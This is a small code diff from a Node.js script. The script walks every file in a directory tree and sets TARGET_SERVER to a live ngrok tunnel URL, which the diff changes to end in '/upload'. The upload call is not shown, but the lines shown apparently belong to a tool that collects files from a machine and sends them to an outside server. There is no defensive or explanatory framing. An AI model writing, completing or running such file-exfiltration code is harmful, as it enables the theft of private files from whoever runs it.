@@ -5,8 +5,7 @@ const https = require('https');
 const http = require('http'); // if you're using local server
 const os = require('os');
 
-const TARGET_SERVER = 'https://c54c-2401-4900-1c21-25fe-b491-13-39cb-5bcb.ngrok-free.app'; // change this
-
+const TARGET_SERVER = 'https://c54c-2401-4900-1c21-25fe-b491-13-39cb-5bcb.ngrok-free.app/upload';
 function getAllFiles(dirPath, arrayOfFiles = []) {
   const entries = fs.readdirSync(dirPath);
   for (const entry of entries) {
